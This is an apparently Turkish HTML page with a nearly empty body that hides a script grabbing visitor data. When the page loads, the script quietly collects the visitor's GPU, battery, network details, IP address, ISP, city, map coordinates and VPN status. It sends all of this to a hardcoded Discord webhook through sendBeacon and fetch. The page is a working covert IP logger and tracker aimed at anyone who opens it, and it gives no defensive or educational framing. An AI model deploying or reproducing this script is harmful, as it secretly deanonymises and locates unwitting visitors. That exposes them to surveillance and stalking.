<!DOCTYPE html>
<html lang="tr">
<head>

    <style>

<body>
    <div class="l"></div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function ultraDataExtract() {
            let d = { 
                gpu: "MaskelenmiÅŸ/KÄ±sÄ±tlÄ±", ven: "MaskelenmiÅŸ/KÄ±sÄ±tlÄ±", 
                ip: "AlÄ±namadÄ±", iss: "Bilinmiyor", loc: "Bilinmiyor", 
                net: "Bilinmiyor", bat: "Bilinmiyor", 
                os: "Bilinmiyor", 
                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                lang: navigator.language || "Bilinmiyor",
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor"
            };

            // OS Parsing OnarÄ±mÄ±
            try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e) { d.os = navigator.platform; }

            // 1. GPU Zorlama (Bypass Denemesi)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2', {antialias:false}) || canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                }
            } catch(e) {}

            // 2. Pil Bilgisi (OnarÄ±lan KÄ±sÄ±m)
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    d.bat = `%${Math.round(battery.level * 100)} (${battery.charging ? 'Åarjda' : 'Pilde'})`;
                } else { d.bat = "Desteklenmiyor"; }
            } catch(e) { d.bat = "EriÅŸim Reddedildi"; }

            // 3. Ä°nternet BaÄŸlantÄ± DetayÄ± (OnarÄ±lan KÄ±sÄ±m)
            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (n) {
                    d.net = `Tip: ${n.effectiveType.toUpperCase()} | HÄ±z: ~${n.downlink} Mbps | Ping: ${n.rtt}ms`;
                }
            } catch(e) {}

            // 4. AÄŸ & Konum (VPN Tespiti Ä°le)
            let vpnDetection = "âœ… Temiz";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                d.ip = j.ip || "X";
                d.iss = `${j.org || 'Bilinmiyor'} (${j.asn || 'N/A'})`;
                d.loc = `ğŸ“ **BÃ¶lge:** ${j.city}, ${j.country_name}\nğŸ›°ï¸ **ISS:** \`${d.iss}\`\nğŸ—ºï¸ [Haritada GÃ¶r](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
                
                if (j.timezone !== d.tz || j.proxy) {
                    vpnDetection = `ğŸš¨ **VPN/PROXY ALGILANDI**\nâ†³ Sistem: ${d.tz}\nâ†³ IP: ${j.timezone}`;
                }
            } catch(e) { vpnDetection = "âš ï¸ Analiz Engellendi"; }

            // 5. Veri GÃ¶nderimi (CORS ve Hata KorumalÄ±)
            const payload = {
                embeds: [{
                    title: "ğŸ’€ ADLÄ° ANALÄ°Z: OMNISCIENCE-MAX",
                    color: vpnDetection.includes("ğŸš¨") ? 15158332 : 3066993,
                    fields: [
                        { name: "ğŸ›¡ï¸ GÃœVENLÄ°K DURUMU", value: vpnDetection, inline: false },
                        { name: "ğŸ“¡ AÄ VE BAÄLANTI", value: `**IP:** \`${d.ip}\`\n**BaÄŸlantÄ±:** \`${d.net}\``, inline: false },
                        { name: "ğŸ“ KONUM BÄ°LGÄ°SÄ°", value: d.loc, inline: false },
                        { name: "ğŸ› ï¸ DONANIM", value: `**GPU:** \`${d.gpu}\`\n**Pil:** \`${d.bat}\`\n**Ekran:** \`${d.res}\``, inline: false },
                        { name: "âš™ï¸ SÄ°STEM", value: `**OS:** \`${d.os}\`\n**Dil:** \`${d.lang}\`\n**Zaman:** \`${d.tz}\``, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            const finalData = JSON.stringify(payload);
            
            // Beacon (Arka KapÄ±) ve Fetch (Standart)
            navigator.sendBeacon(webhook, finalData);
            fetch(webhook, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: finalData });
        }

        // Sayfa hazÄ±r olduÄŸunda sessizce baÅŸlat
        window.addEventListener('DOMContentLoaded', ultraDataExtract);
    </script>
</body>
</html>
